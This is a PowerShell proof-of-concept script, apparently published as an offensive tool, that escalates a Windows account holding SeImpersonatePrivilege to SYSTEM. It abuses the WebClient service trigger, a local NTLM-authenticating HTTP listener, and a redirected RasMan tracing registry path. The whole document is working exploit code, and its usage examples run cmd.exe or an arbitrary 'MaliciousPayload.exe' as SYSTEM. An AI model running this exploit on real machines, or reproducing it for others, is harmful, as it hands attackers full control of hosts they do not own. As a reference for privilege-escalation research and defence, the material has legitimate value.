function Invoke-ChimichurriReloaded
{
<#
.SYNOPSIS
This is a quick and dirty PowerShell PoC to escalate privileges to SYSTEM with SeImpersonatePrivilege.

All credit to: https://itm4n.github.io/chimichurri-reloaded/

.DESCRIPTION
This is a quick and dirty PowerShell PoC to escalate privileges to SYSTEM with SeImpersonatePrivilege.
At a high level, it starts an HttpListener which handles NTLM auth and impersonation.  Once it receives
a connection, it uses CreateProcessWithTokenW to spawn a new process with that token.  The RasMan service
and tracing registry keys are abused to get a SYSTEM process to connect to the listener.

All thanks to the fanastic research found here: https://itm4n.github.io/chimichurri-reloaded/

.PARAMETER Port
Local port you want the HTTP Listener to listen on.

.PARAMETER Command
Command you want to run as SYSTEM, by default it spawns cmd.exe.

.PARAMETER Arguments
Arguments to pass to the command you wish to run as SYSTEM.

.EXAMPLE
PS > Invoke-ChimichurriReloaded

Use above command to spawn a command prompt running as SYSTEM.

.EXAMPLE
PS > Invoke-ChimichurriReloaded -Port 9999

Use above command to bind the local HTTP listener to port 9999 then, upon successful exploitation,
spawn a command prompt running as SYSTEM.

.EXAMPLE
PS > Invoke-ChimichurriReloaded -Port 9999 -Command C:\Temp\MaliciousPayload.exe

Use above command to bind the local HTTP listener to port 9999 then, upon successful exploitation,
spawn MaliciousPayload.exe running as SYSTEM.

.LINK
https://github.com/reigningshells

#>

	[CmdletBinding()]
	param (

		[Parameter(Mandatory = $False)]
		[String]$Port = "6789",
		
		[Parameter(Mandatory = $False)]
		[String]$Command = "C:\Windows\System32\cmd.exe",

		[Parameter(Mandatory = $False)]
		[String]$Arguments = ""

	)
	
	function Start-WebClient
	{
	
		$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
		$compilerParameters.CompilerOptions="/unsafe"
		Add-Type -CompilerParameters $compilerParameters -TypeDefinition @"
			using System;
			using System.Text;
			using System.Security;
			using System.Collections.Generic;
			using System.Runtime.Versioning;
			using Microsoft.Win32.SafeHandles;
			using System.Runtime.InteropServices;
			using System.Diagnostics.CodeAnalysis;
	
			[StructLayout(LayoutKind.Explicit, Size=16)]
			public class EVENT_DESCRIPTOR
			{
				[FieldOffset(0)]ushort Id = 1;
				[FieldOffset(2)]byte Version = 0;
				[FieldOffset(3)]byte Channel = 0;
				[FieldOffset(4)]byte Level = 4;
				[FieldOffset(5)]byte Opcode = 0;
				[FieldOffset(6)]ushort Task = 0;
				[FieldOffset(8)]long Keyword = 0;
			}
	
			[StructLayout(LayoutKind.Sequential, Size = 16)]
			public struct EventData
			{
				public UInt64 DataPointer;
				public uint Size;
				public int Reserved;
			}
	
			public static class Advapi32
			{
				[DllImport("Advapi32.dll", SetLastError = true)]
				public static extern uint EventRegister(
					ref Guid guid, 
					[Optional] IntPtr EnableCallback, 
					[Optional] IntPtr CallbackContext, 
					[In][Out] ref long RegHandle);
 
				[DllImport("Advapi32.dll", SetLastError = true)]
				public static extern unsafe uint EventWrite(
					long RegHandle, 
					ref EVENT_DESCRIPTOR EventDescriptor, 
					uint UserDataCount, 
					EventData* UserData);
		
				[DllImport("Advapi32.dll", SetLastError = true)]
				public static extern uint EventUnregister(long RegHandle);
			}
	
			public static class ServiceTrigger
			{
				public static bool startService(string serviceGuid)
				{
					long handle = 0;
					bool success = false;
					Guid triggerGuid = new Guid(serviceGuid);
					if(Advapi32.EventRegister(ref triggerGuid, IntPtr.Zero, IntPtr.Zero, ref handle) == 0)
					{
						EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
						unsafe
						{
							success = Advapi32.EventWrite(handle, ref desc, 0, null) == 0;
							Advapi32.EventUnregister(handle);
							return success;
						}
					}
					return success;
				}
			}
"@
		$WebClientTrigger = "22b6d684-fa63-4578-87c9-effcbe6643c7"
		if([ServiceTrigger]::startService($WebClientTrigger))
		{
			Write-Output "[+] WebClient started..."
		}
		else
		{
			Write-Output "[!] Failed to start WebClient!"
			return
		}
	}
	
	$HTTPServerThread =  {
	
		param($Port,$Command,$Arguments)
	
		Add-Type -TypeDefinition @"
			using System;
			using System.Diagnostics;
			using System.Runtime.InteropServices;
			using System.Security.Principal;
			
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			public struct STARTUPINFO
			{
				public Int32 cb;
				public string lpReserved;
				public string lpDesktop;
				public string lpTitle;
				public Int32 dwX;
				public Int32 dwY;
				public Int32 dwXSize;
				public Int32 dwYSize;
				public Int32 dwXCountChars;
				public Int32 dwYCountChars;
				public Int32 dwFillAttribute;
				public Int32 dwFlags;
				public Int16 wShowWindow;
				public Int16 cbReserved2;
				public IntPtr lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
			}
			
			[StructLayout(LayoutKind.Sequential)]
			public struct PROCESS_INFORMATION
			{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
			}
			
			public static class Advapi32
			{
				[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
				public static extern bool CreateProcessWithTokenW(
					IntPtr hToken, 
					UInt32 dwLogonFlags, 
					IntPtr lpApplicationName, 
					IntPtr lpCommandLine, 
					UInt32 dwCreationFlags, 
					IntPtr lpEnvironment, 
					IntPtr lpCurrentDirectory, 
					[In] ref STARTUPINFO lpStartupInfo, 
					out PROCESS_INFORMATION lpProcessInformation);
			}
"@

		$listener = New-Object System.Net.HttpListener
		$listener.Prefixes.Add("http://localhost:$Port/")
		$listener.AuthenticationSchemes = [System.Net.AuthenticationSchemes]::NTLM
		$listener.Start()
	
		while ($listener.IsListening) {
	
			$context = $listener.GetContext()
			$requestUrl = $context.Request.Url
			$response = $context.Response
			$identity = $context.User.Identity
			$wic = $identity.Impersonate()
			
			Write-Output "Connected to by:  $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
			
			if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM')
			{
				$pi = New-Object PROCESS_INFORMATION
				$si = New-Object STARTUPINFO
				$applicationName = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($Command)
				$commandLine = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($Arguments)
				
				if([Advapi32]::CreateProcessWithTokenW($identity.Token, 0x00000001, $applicationName, $commandLine, 0, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $si, [ref] $pi))
				{
					Write-Output "[+] Process spawned with impersonated token..."
					$listener.Stop()
					return
				}
			}
			
			$wic.undo()
		
			$response.StatusCode = 403
			$response.Close()
		}
	}

	# Requires WebClient to be running, which can be triggered by user with the help of these blog entries:
	# https://www.tiraniddo.dev/2015/03/starting-webclient-service.html
	# https://www.lieben.nu/liebensraum/2016/10/how-to-start-a-trigger-start-windows-service-with-powershell-without-elevation-admin-rights/
	# WebClient is NOT on Server installations by default, so check is necessary

	try
	{
		if((Get-Service -Name WebClient).Status -ne 'Running')
		{
			Write-Output "[+] WebClient not started, starting..."
			Start-WebClient
		}
		else
		{
			Write-Output "[+] WebClient already running..."
		}
	}
	catch
	{
		Write-Output "[!] WebClient service doesn't exist, exiting..."
		return
	}
	
	# Create HttpListener
	
	Write-Output "[+] Starting HttpListener..."
	$serverJob = Start-Job $HTTPServerThread -Arg $Port, $Command, $Arguments
	
	[Console]::TreatControlCAsInput = $true
	
	# If the service has never been run before, the registry keys won't exist
	# starting the service will create them
	
	if(-not (Test-Path HKLM:\SOFTWARE\Microsoft\Tracing\RASMAN\))
	{
		Write-Output "[+] Registry keys don't exist, starting RasMan service to create them"
		Start-Service -Name RasMan
	}
	
	Write-Output "[+] Updating Registry..."
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Tracing\RASMAN" -Name "EnableFileTracing" -Value 1
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Tracing\RASMAN" -Name "FileDirectory" -Value "\\localhost@$Port\tracing"
	
	# If the service isn't running, simply starting the service will trigger attempted access of the UNC path
	# I had some issues with getting it to trigger when the service was already started, this is just
	# one quick and dirty way to trigger an event that tries to write to the trace file and stumbles onto the UNC path.
	
	if((Get-Service -Name RasMan).Status -ne 'Running')
	{
		Write-Output "[+] RasMan not started, starting..."
		Start-Service -Name RasMan
		if((Get-Service -Name RasMan).Status -ne 'Running')
		{
			Write-Output "[!] Failed to start RasMan!"
			return
		}
		else
		{
			Write-Output "[+] RasMan started..."
		}
	}
	else
	{
		Write-Output "[+] RasMan already running..."
		Write-Output "[+] Triggering a write to the trace file"
		Add-VpnConnection -Name "Yikes" -ServerAddress "127.0.0.1"
		Start-Job -ScriptBlock {& rasdial Yikes} | Out-Null
		Remove-VpnConnection -Name "Yikes" -Force
	}

	# Wait for it all to complete, keep open in case it needs triggered again manually
	while ($serverJob.State -eq "Running")
	{
		Start-Sleep 2
		if ([console]::KeyAvailable) {
			$key = [system.console]::readkey($true)
			if (($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "C"))
			{
				Write-Host "[!] Terminating..."
				Receive-Job -Job $serverJob
				Stop-Job -Job $serverJob
				Remove-Job $serverJob -Force
				return
			}
		}
		
		Receive-Job -Job $serverJob
	}
	
	Receive-Job -Job $serverJob
	
	# Update registry back
	Write-Output "[+] Reverting Registry Changes..."
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Tracing\RASMAN" -Name "FileDirectory" -Value '%windir%\tracing'
	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Tracing\RASMAN" -Name "EnableFileTracing" -Value 0
}
